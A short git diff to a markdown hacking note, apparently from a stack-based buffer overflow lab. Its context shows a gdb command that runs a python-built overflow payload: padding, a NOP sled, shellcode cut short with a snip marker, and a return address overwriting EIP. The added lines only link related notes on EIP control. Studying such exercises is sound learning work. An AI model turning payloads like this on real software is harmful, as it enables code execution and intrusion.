@@ -60,3 +60,8 @@ Then we run our exploit again:
 ```bash
 (gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
 ```
+
+
+## Related
+- [Take Control of EIP](notes/hacking/take-control-eip.md)
+- [Stack-based Buffer Overflows on Linux x86](notes/hacking/htb-stack-based-overflow-linux.md)
